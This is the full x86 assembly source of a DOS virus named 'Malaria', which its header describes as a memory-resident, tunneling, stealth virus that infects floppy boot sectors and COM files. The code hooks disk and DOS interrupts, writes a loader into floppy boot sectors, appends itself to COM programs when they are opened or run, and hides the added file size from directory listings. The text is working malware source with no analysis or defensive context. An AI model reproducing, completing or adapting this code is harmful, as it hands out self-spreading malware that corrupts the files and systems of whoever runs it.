;
;=============================================================================
; [Malaria]
; TSR, parasitic, tunneling, sub-stealth, floppy, COM infecting virus
;=============================================================================
;

virus_size              equ     (v_end-v_start)
loader_size             equ     (loader_end-loader_start)
paragraph_size          equ     (heap_end-v_start+010Fh)/0010h+0001h

       .model   tiny
       .code
       .286 
        org     0100h
start:
v_start:
        push    ds es
        dec     ax
        int     0013h
        inc     ax
        jz      exit_install
        mov     ax,es
        dec     ax
        mov     ds,ax
        mov     bx,5A4Dh
        sub     si,si
        cmp     bl,byte ptr [si]
        jz      exit_install
        mov     ax,offset exit_install
delta_two       =       $-0002h
        push    cs ax
        sub     word ptr [si+0003h],paragraph_size
        sub     word ptr [si+0012h],paragraph_size
        mov     byte ptr [si],bl
        mov     ax,word ptr [si+0012h]
        mov     ds,ax
        mov     byte ptr [si],bh
        mov     word ptr [si+0001h],0008h
        mov     word ptr [si+0003h],paragraph_size-0001h
        inc     ax
        mov     es,ax
        push    ax
        mov     si,offset v_start
delta_one       =       $-0002h
        mov     cx,virus_size
        mov     di,offset v_start
        rep     movs byte ptr [di],cs:[si]
        mov     ax,offset trace_interrupt
        push    ax
        retf
exit_install:
        pop     es ds
        mov     si,offset host_bytes
delta_three     =       $-0002h
        mov     di,offset v_start
	push	di
        movsb
        movsw
        retn
loader_start:
        mov     ax,0B900h
        mov     es,ax
        push    ax
        mov     ax,offset restore_boot_sector
        push    ax
        mov     ax,0202h
        mov     bx,offset v_start
        mov     cx,'ML'
loader_fix_1    =       $-0002h
        inc     dh
        int     0013h
        retf
loader_end:
restore_boot_sector:
        xor     ax,ax
        mov     es,ax
        mov     si,offset boot_bytes
        mov     di,7C00h
        push    ax di
        mov     cl,loader_size shr 0001h
        rep     movs word ptr [di],cs:[si]
        mov     ax,word ptr es:[0084h]
        mov     word ptr cs:[int_word],ax
        push    cs
        pop     es
        mov     byte ptr cs:[trace_interrupt_],00C3h
        call    trace_interrupt
        mov     byte ptr cs:[trace_interrupt_],00BEh
        retf
trace_interrupt:
        mov     ds,cx
	mov	byte ptr cs:[trap_flag],cl
        mov     si,004Ch
        mov     di,offset i0013hOffset
        movsw
        movsw
        mov     word ptr [si-0004h],offset i0013h
        mov     word ptr [si-0002h],cs
trace_interrupt_:
        mov     si,0084h
        mov     di,offset i0021hOffset
        movsw
        movsw
        mov     word ptr [si-0004h],offset i0021h
        mov     word ptr [si-0002h],cs
        mov     si,0004h
        push    word ptr ds:[si] word ptr ds:[si+0002h]
        mov     word ptr [si],offset i0001h
        mov     word ptr [si+0002h],cs
        mov     ah,0052h
        int     0021h
        mov     word ptr cs:[dos_segment],es
        mov     ah,0001h
        push    ax
        popf
        mov     ah,0019h
        call    call_i0021h
        pop     word ptr ds:[si+0002h] word ptr ds:[si]
        retf
i0001h: push    bp
        mov     bp,sp
        push    ax
        cmp     byte ptr cs:[trap_flag],0001h
        jz      i0001h_exit_
        mov     ax,word ptr [bp+0004h]
        cmp     ax,0D00Dh
dos_segment     =       $-0002h
        jnz     i0001h_exit
        mov     word ptr cs:[t0021hSegment],ax
        mov     ax,word ptr [bp+0002h]
        mov     word ptr cs:[t0021hOffset],ax
        inc     byte ptr cs:[trap_flag]
i0001h_exit_:
        and     byte ptr [bp+0007h],-0002h
i0001h_exit:
        pop     ax bp
int_return:
        iret
i0013h:	cmp	ax,-0001h
        jz      int_return
        cmp     byte ptr cs:[trap_flag],0001h
        jz      i0013h_continue
        pusha
        push    ds es cs
        pop     es
        cwd
        mov     ds,dx
        mov     ax,word ptr ds:[0084h]
        cmp     ax,word ptr cs:[int_word]
        jz      hook_exit
        push    cs
        call    trace_interrupt_
hook_exit:
        pop     es ds
        popa
i0013h_continue:
        cmp     dl,0001h
	jnb	original_i0013h
        cmp     ah,0002h
	jz	i0013h_stealth_boot
        pusha
        push    ds es
        cmp     ah,0003h
        jnz     i0013h_exit
i0013h_infect_boot:
        mov     ax,0BBE8h
        mov     es,ax
        mov     ax,0201h
        xor     bx,bx
        mov     cx,0001h
        xor     dh,dh
        call    call_i0013h
        cmp     byte ptr es:[bx],00B8h
        jz      i0013h_exit
        mov     al,byte ptr es:[bx+0010h]
        mul     byte ptr es:[bx+0016h]
        xchg    ax,cx
        mov     ax,word ptr es:[bx+0011h]
        shr     ax,0004h
        add     ax,cx
        sub     ax,word ptr es:[bx+0018h]
        mov     word ptr cs:[loader_fix_1],ax
        push    ax es es cs
        pop     es ds
        mov     cl,loader_size shr 0001h
        xor     si,si
        mov     di,offset boot_bytes
        rep     movsw
        pop     es
        mov     cl,loader_size shr 0001h
        mov     si,offset loader_start
        sub     di,di
        rep     movs word ptr [di],cs:[si]
        mov     ax,0301h
        inc     cx
        call    call_i0013h
        push    cs
        pop     es
        mov     ax,0302h
        mov     bx,offset v_start
        pop     cx
        inc     dh
        call    call_i0013h
i0013h_exit:
        pop     es ds
        popa
original_i0013h:
        db      00EAh,'PURE'
i0013hOffset    =       $-0004h
i0013hSegment   =       $-0002h
i0013h_stealth_boot:
        cmp     cx,0001h
        jnz     original_i0013h
        or      dh,dh
        jnz     original_i0013h
        pusha
        call    call_i0013h
	jc	i0013h_stealth_boot_exit
        cmp     byte ptr es:[bx],00B8h
        jnz     i0013h_stealth_boot_exit
        mov     si,offset boot_bytes
        mov     di,bx
        mov     cl,loader_size shr 0001h
        rep     movs word ptr [di],cs:[si]
i0013h_stealth_boot_exit:
        popa
	clc
        retf    0002h
i0021h: cmp     ah,0011h
        jz      fcb_stealth
        cmp     ah,0012h
        jz      fcb_stealth
        cmp     ah,004Eh
        jz      dta_stealth
        cmp     ah,004Fh
        jz      dta_stealth
        pusha
        push    ds es
        cmp     ax,4300h
        jz      i0021h_infect_file
        cmp     ax,4301h
        jz      i0021h_infect_file
        cmp     ax,4B00h
        jz      i0021h_infect_file
i0021h_exit:
        pop     es ds
        popa
original_i0021h:
        db      00EAh,'TEXT'
i0021hOffset    =       $-0004h
i0021hSegment   =       $-0002h
fcb_stealth:
        call    call_i0021h
        pusha
        push    es
        inc     al
        jz      fcb_exit_
        mov     ah,002Fh
        call    tunnel_i0021h
        cmp     byte ptr es:[bx],-0001h
        jnz     fcb_continue           
        add     bx,0007h
fcb_continue:
        mov     ax,word ptr es:[bx+0017h]
        mov     cx,word ptr es:[bx+0019h]
        call    hide_dir
fcb_exit_:
        pop     es
        popa
fcb_exit:
        iret
dta_stealth:
        call    call_i0021h
        jc      dta_exit
        pusha
        push    es
        mov     ah,002Fh
        call    tunnel_i0021h
        mov     ax,word ptr es:[bx+0016h]
        mov     cx,word ptr es:[bx+0018h]
        sub     bx,0003h
        call    hide_dir
        pop     es
        popa
dta_exit:
        retf    0002h
_close_file:
        jmp     close_file
i0021h_infect_file:
        push    ds
        pop     es
        mov     al,002Eh
        mov     cx,0040h
        mov     di,dx
        repnz   scasb
        cmp     word ptr [di],4F43h
        jnz     i0021h_exit
        mov     ax,3D02h
        call    tunnel_i0021h
        xchg    ax,bx
        mov     ax,1220h
        int     002Fh
        push    bx
        mov     ax,1216h
        mov     bl,byte ptr es:[di]
        int     002Fh
        pop     bx
        mov     si,offset temp_buffer
        push    cs
        pop     ds
        mov     ah,003Fh
        mov     cl,0003h
        mov     dx,si
        call    tunnel_i0021h
        cmp     word ptr [si],5A4Dh
        jz      close_file
        cmp     word ptr [si],4D5Ah
        jz      close_file
        push    si
        lodsb
        mov     byte ptr [si-0004h],al
        lodsw
        mov     word ptr [si-0005h],ax
        pop     si
        mov     ax,word ptr es:[di+0011h]
	mov	word ptr es:[di+0015h],ax
        mov     cx,virus_size
        cmp     ax,cx
        jb      close_file
        push    ax
        sub     ax,0003h
        mov     byte ptr [si],00E9h
        mov     word ptr [si+0001h],ax    
        sub     ax,cx
        cmp     ax,word ptr [si-0002h]
        pop     ax
        jz      close_file
        add     ax,offset v_start
        mov     word ptr [delta_one],ax
        add     ax,offset exit_install-v_start
        mov     word ptr [delta_two],ax
        add     ax,offset host_bytes-exit_install
        mov     word ptr [delta_three],ax
        mov     ah,0040h
        mov     dx,offset v_start
        call    tunnel_i0021h
        mov     word ptr es:[di+0015h],0000h
        mov     ah,0040h
        mov     cx,0003h
        mov     dx,si
        call    tunnel_i0021h
        mov     ax,5701h
        mov     cx,word ptr es:[di+000Dh]
        mov     dx,word ptr es:[di+000Fh]
        push    dx
        and     cx,-0020h
        and     dx,001Fh
        dec     dx
        or      cx,dx
        pop     dx
        call    tunnel_i0021h
close_file:
        mov     ah,003Eh
        call    tunnel_i0021h
        jmp     i0021h_exit
hide_dir:
        mov     si,001Fh
        and     ax,si
        and     cx,si
        dec     cx
        xor     ax,cx
        jnz     hide_exit
        cmp     ax,word ptr es:[bx+si]
        ja      hide_exit
        mov     ax,virus_size
        cmp     word ptr es:[bx+si-0002h],ax
        jbe     hide_exit
hide_continue:
        sub     word ptr es:[bx+si-0002h],ax
hide_exit:
        retn
tunnel_i0021h:
        pushf
        db      009Ah,'PURE'
t0021hOffset     =       $-0004h
t0021hSegment    =       $-0002h
        retn
call_i0013h:
        pushf
        push    cs
        call    original_i0013h
        retn
call_i0021h:
        pushf
        push    cs
        call    original_i0021h
        retn
boot_bytes      db      loader_size dup (0000h)
host_bytes      db      00CDh,0020h,'!'
v_end:
heap_start:
temp_buffer     db      0003h dup (?)
trap_flag       db      0001h dup (?)
int_word        db      0002h dup (?)
heap_end:
end     start
.
